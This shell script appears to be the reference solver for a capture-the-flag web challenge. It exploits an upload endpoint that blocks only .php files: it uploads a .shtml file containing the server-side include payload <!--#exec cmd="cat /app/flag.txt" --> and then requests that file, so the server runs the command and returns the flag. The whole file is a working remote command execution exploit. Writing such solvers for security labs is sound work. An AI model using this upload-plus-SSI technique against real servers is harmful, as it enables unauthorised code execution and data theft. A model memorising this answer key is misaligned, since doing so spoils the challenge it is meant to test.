#!/bin/sh
# Prints the flag to stdout.
# The verifier sets CHALLENGE_HOST, CHALLENGE_PORT, and CHALLENGE_CONNECTION.
#
# The upload endpoint rejects only the `php` extension and writes everything
# else into the document root. This Apache instance parses `.shtml` through
# mod_include with the `exec` directive enabled, so an uploaded file containing
#
#   <!--#exec cmd="cat /app/flag.txt" -->
#
# runs the command as the server user and inlines its output into the response.
set -eu

if [ -n "${CHALLENGE_CONNECTION:-}" ]; then
  base="${CHALLENGE_CONNECTION}"
elif [ -n "${CHALLENGE_HOST:-}" ]; then
  base="http://${CHALLENGE_HOST}:${CHALLENGE_PORT:?}"
else
  base="http://127.0.0.1:${CHALLENGE_PORT:-80}"
fi
base="${base%/}"

# A name only the solver uses, so a rerun does not read a stale response.
name='hg_probe.shtml'

# The SSI directive is executed during response filtering, when the request is
# served, not at upload time.
printf '<!--#exec cmd="cat /app/flag.txt" -->\n' > /tmp/hg-ssi.shtml

# Confirm the upload endpoint is the one we expect before relying on it.
form=$(curl -fsS "$base/upload.php")
printf '%s\n' "$form" | grep -q 'file_upload'

curl -fsS -o /dev/null -F "file_upload=@/tmp/hg-ssi.shtml;filename=$name" "$base/upload.php"

curl -fsS "$base/$name" | tr -d '\r' | sed -e 's/[[:space:]]*$//'
